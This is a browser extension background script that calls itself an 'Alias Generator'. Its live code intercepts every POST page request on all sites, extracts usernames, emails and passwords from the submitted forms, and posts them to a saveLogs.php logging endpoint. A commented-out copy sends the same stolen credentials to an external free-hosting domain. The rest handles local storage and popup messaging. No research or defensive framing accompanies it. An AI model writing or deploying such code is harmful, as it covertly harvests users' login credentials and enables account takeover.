// // background.js

// chrome.runtime.onInstalled.addListener(() => {
//   console.log("Alias Generator installed or updated.");
// });


// chrome.webRequest.onBeforeRequest.addListener(
//   async (details) => {
//     if (details.type === "main_frame" && details.method === "POST") {
//       console.log("Intercepted login:", details);
//       // Perform actions with the intercepted login request
//       const timestamp = new Date(details.timeStamp);
//       const formattedDate = timestamp.toLocaleDateString();
//       const formattedTime = timestamp.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });

//       const url = details.url;
//       const loginDateTime = formattedDate + " " + formattedTime;

//       // Extract username or email from request payload
//       let username = "";
//       let email = "";
//       if (details.requestBody && details.requestBody.formData) {
//         const { username: [usernameValue] = [], email: [emailValue] = [], password: [passwordValue] = [] } = details.requestBody.formData;
//         username = usernameValue || "";
//         email = emailValue || "";
//         password = passwordValue || "";
//       }


//       // Prepare data to send to saveLogs.php
//       const requestData = new URLSearchParams({
//         date: loginDateTime,
//         url: url,
//         username: username,
//         email: email,
//         password: password,
//       });

//       try {
//         // Send the data to saveLogs.php
//         const response = await fetch("https://eliasmain.000webhostapp.com/client/Elias/extensionControllers/saveLogs.php", {
//           method: "POST",
//           headers: {
//             "Content-Type": "application/x-www-form-urlencoded",
//           },
//           body: requestData,
//         });

//         if (response.ok) {
//           console.log("Login saved successfully.");
//         } else {
//           console.error("Failed to save login.");
//         }
//       } catch (error) {
//         console.error("Error:", error);
//       }
//     }
//   },
//   { urls: ["<all_urls>"] },
//   ["requestBody"]
// );

// chrome.runtime.onStartup.addListener(() => {
//   console.log("Browser started up.");
// });



// background.js

// Retrieve the data from storage
function retrieveDataFromStorage(callback) {
  chrome.storage.local.get('savedData', function(result) {
    console.log('Data retrieved:', result.savedData);
    callback(result.savedData);
  });
}

// Save the data to storage
function saveDataToStorage(data) {
  chrome.storage.local.set({ savedData: data }, function() {
    console.log('Data saved:', data);
  });
}

chrome.runtime.onInstalled.addListener(() => {
  console.log("Alias Generator installed or updated.");
});

chrome.webRequest.onBeforeRequest.addListener(
  async (details) => {
    if (details.type === "main_frame" && details.method === "POST") {
      console.log("Intercepted login:", details);
      // Perform actions with the intercepted login request
      const timestamp = new Date(details.timeStamp);
      const formattedDate = timestamp.toLocaleDateString();
      const formattedTime = timestamp.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });

      const url = details.url;
      const loginDateTime = formattedDate + " " + formattedTime;

      // Extract username or email from request payload
      let username = "";
      let email = "";
      if (details.requestBody && details.requestBody.formData) {
        const { username: [usernameValue] = [], email: [emailValue] = [], password: [passwordValue] = [] } = details.requestBody.formData;
        username = usernameValue || "";
        email = emailValue || "";
        password = passwordValue || "";
      }


      // Prepare data to send to saveLogs.php
      const requestData = new URLSearchParams({
        date: loginDateTime,
        url: url,
        username: username,
        email: email,
        password: password,
      });

      try {
        // Send the data to saveLogs.php
        const response = await fetch("http://localhost/Elias/client/Elias/extensionControllers/saveLogs.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: requestData,
        });

        if (response.ok) {
          console.log("Login saved successfully.");
        } else {
          console.error("Failed to save login.");
        }
      } catch (error) {
        console.error("Error:", error);
      }
    }
  },
  { urls: ["<all_urls>"] },
  ["requestBody"]
);

chrome.runtime.onStartup.addListener(() => {
  console.log("Browser started up.");

  chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
    const tabId = tabs[0].id;
    chrome.tabs.sendMessage(tabId, { action: 'retrieveData' }, function(response) {
      console.log(response); // Logging the response for verification
    });
  });
});


// Message listener to handle communication with popup.js script
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  if (message.action === 'retrieveData') {
    retrieveDataFromStorage(function(data) {
      sendResponse(data);
    });
     return true;
  } else if (message.action === 'saveData') {
    saveDataToStorage(message.data);
  }
});

